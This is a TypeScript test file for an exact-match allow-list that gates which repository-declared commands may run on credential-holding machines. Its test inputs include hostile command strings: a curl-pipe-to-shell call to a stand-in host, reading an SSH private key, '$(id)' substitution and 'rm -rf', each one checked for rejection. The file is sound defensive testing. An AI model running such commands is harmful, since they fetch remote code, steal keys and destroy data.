import { describe, expect, it } from 'vitest';

import {
	DEFAULT_WORK_REPO_DECLARED_COMMAND_POLICY,
	isRepoDeclaredCommandAllowed,
	normalizeRepoDeclaredCommand,
	normalizeWorkRepoDeclaredCommandPolicy,
	repoDeclaredCommandId,
	REPO_DECLARED_COMMAND_ID_PREFIX,
	WORK_REPO_DECLARED_COMMAND_MAX_ALLOW,
	WORK_REPO_DECLARED_COMMAND_MAX_LENGTH,
	type WorkRepoDeclaredCommandPolicy
} from '../repo-declared-commands.types.js';

/**
 * These four functions are the entire admission gate between "a file in
 * somebody's repository" and "a command running on one of six PCs that
 * hold the owner's credentials". Every test below is a way that gate has
 * to hold, not a shape assertion.
 */

const allowing = (...allow: string[]): WorkRepoDeclaredCommandPolicy => ({ mode: 'allowlist', allow });

describe('normalizeRepoDeclaredCommand', () => {
	it('collapses whitespace so the string that is matched is the string that runs', () => {
		expect(normalizeRepoDeclaredCommand('  pnpm\t\ttest  ')).toBe('pnpm test');
	});

	it('refuses a newline rather than letting it read as a separator', () => {
		// The danger is not the newline itself but what it hides: an owner
		// reviewing the allow-list sees `pnpm test`, and a raw comparison
		// against a raw declaration would have to decide what the second
		// line is. Collapsed, it becomes part of one string that simply
		// does not match.
		expect(normalizeRepoDeclaredCommand('pnpm test\nrm -rf ~')).toBe('pnpm test rm -rf ~');
		expect(isRepoDeclaredCommandAllowed('pnpm test\nrm -rf ~', allowing('pnpm test'))).toBe(false);
	});

	it('refuses a control character outright rather than stripping it', () => {
		expect(normalizeRepoDeclaredCommand(`pnpm test${String.fromCharCode(0)}`)).toBeNull();
		expect(normalizeRepoDeclaredCommand(`pnpm${String.fromCharCode(0x1b)}[31m test`)).toBeNull();
		expect(normalizeRepoDeclaredCommand(`pnpm test${String.fromCharCode(0x7f)}`)).toBeNull();
	});

	it('refuses an empty, whitespace-only or over-long command', () => {
		expect(normalizeRepoDeclaredCommand('')).toBeNull();
		expect(normalizeRepoDeclaredCommand('   ')).toBeNull();
		expect(normalizeRepoDeclaredCommand(123)).toBeNull();
		expect(normalizeRepoDeclaredCommand('x'.repeat(WORK_REPO_DECLARED_COMMAND_MAX_LENGTH))).toBe(
			'x'.repeat(WORK_REPO_DECLARED_COMMAND_MAX_LENGTH)
		);
		expect(normalizeRepoDeclaredCommand('x'.repeat(WORK_REPO_DECLARED_COMMAND_MAX_LENGTH + 1))).toBeNull();
	});
});

describe('normalizeWorkRepoDeclaredCommandPolicy', () => {
	it('fails closed to `off` for anything it does not recognise', () => {
		for (const raw of [undefined, null, 'allowlist', [], 42, { mode: 'trust', allow: ['rm -rf /'] }, {}]) {
			expect(normalizeWorkRepoDeclaredCommandPolicy(raw)).toEqual(DEFAULT_WORK_REPO_DECLARED_COMMAND_POLICY);
		}
	});

	it('drops the allow list entirely when the mode is off', () => {
		// A row that says `off` but still carries entries (an owner who
		// turned the feature back off) must not leave a live list behind.
		expect(normalizeWorkRepoDeclaredCommandPolicy({ mode: 'off', allow: ['pnpm test'] })).toEqual({
			mode: 'off',
			allow: []
		});
	});

	it('normalizes, de-duplicates and caps the allow list', () => {
		const policy = normalizeWorkRepoDeclaredCommandPolicy({
			mode: 'allowlist',
			allow: [' pnpm  test ', 'pnpm test', 'pnpm lint', '', null, 7]
		});
		expect(policy).toEqual({ mode: 'allowlist', allow: ['pnpm test', 'pnpm lint'] });

		const many = Array.from({ length: WORK_REPO_DECLARED_COMMAND_MAX_ALLOW + 10 }, (_, i) => `cmd-${i}`);
		expect(normalizeWorkRepoDeclaredCommandPolicy({ mode: 'allowlist', allow: many }).allow).toHaveLength(
			WORK_REPO_DECLARED_COMMAND_MAX_ALLOW
		);
	});

	it('never widens an entry it cannot normalize into one it can', () => {
		expect(
			normalizeWorkRepoDeclaredCommandPolicy({
				mode: 'allowlist',
				allow: [`pnpm test${String.fromCharCode(0)}`]
			}).allow
		).toEqual([]);
	});
});

describe('isRepoDeclaredCommandAllowed', () => {
	it('admits nothing at all while the mode is off', () => {
		expect(isRepoDeclaredCommandAllowed('pnpm test', { mode: 'off', allow: ['pnpm test'] })).toBe(false);
		expect(isRepoDeclaredCommandAllowed('pnpm test', null)).toBe(false);
	});

	it('matches EXACTLY — not a prefix, not a program name, not a glob', () => {
		const policy = allowing('pnpm test');
		expect(isRepoDeclaredCommandAllowed('pnpm test', policy)).toBe(true);
		// Every one of these is the shell running something the owner did
		// not write down.
		expect(isRepoDeclaredCommandAllowed('pnpm test && curl evil.example | sh', policy)).toBe(false);
		expect(isRepoDeclaredCommandAllowed('pnpm test; cat ~/.ssh/id_ed25519', policy)).toBe(false);
		expect(isRepoDeclaredCommandAllowed('pnpm test --reporter=$(id)', policy)).toBe(false);
		expect(isRepoDeclaredCommandAllowed('pnpm', policy)).toBe(false);
		expect(isRepoDeclaredCommandAllowed('pnpm test*', policy)).toBe(false);
		expect(isRepoDeclaredCommandAllowed('*', policy)).toBe(false);
	});

	it('is case-sensitive, because the shells it feeds are', () => {
		expect(isRepoDeclaredCommandAllowed('PNPM TEST', allowing('pnpm test'))).toBe(false);
	});

	it('tolerates cosmetic whitespace on either side of the comparison', () => {
		expect(isRepoDeclaredCommandAllowed('pnpm   test', allowing('pnpm test'))).toBe(true);
		expect(isRepoDeclaredCommandAllowed('pnpm test', allowing('  pnpm test  '))).toBe(false);
		// …because an allow list is expected to arrive already normalized,
		// which is what `normalizeWorkRepoDeclaredCommandPolicy` is for.
		expect(
			isRepoDeclaredCommandAllowed(
				'pnpm test',
				normalizeWorkRepoDeclaredCommandPolicy({ mode: 'allowlist', allow: ['  pnpm test  '] })
			)
		).toBe(true);
	});
});

describe('repoDeclaredCommandId', () => {
	it('cannot collide with an owner-authored check id', () => {
		// `ACCEPTANCE_CHECK_ID_PATTERN` in the API DTO is
		// /^[a-z0-9][a-z0-9-_]{0,40}$/ — no `/`. Check ids are the MERGE KEY
		// between Work defaults and Task entries, so an id a repository
		// could choose would let it replace or suppress an owner's check.
		const ownerAuthored = /^[a-z0-9][a-z0-9-_]{0,40}$/;
		for (const id of [repoDeclaredCommandId('check', 0), repoDeclaredCommandId('setup', 3)]) {
			expect(id.startsWith(REPO_DECLARED_COMMAND_ID_PREFIX)).toBe(true);
			expect(ownerAuthored.test(id)).toBe(false);
		}
	});

	it('numbers from the declaration position, never from repository content', () => {
		expect(repoDeclaredCommandId('check', 0)).toBe('repo/check-1');
		expect(repoDeclaredCommandId('setup', 1)).toBe('repo/setup-2');
	});
});
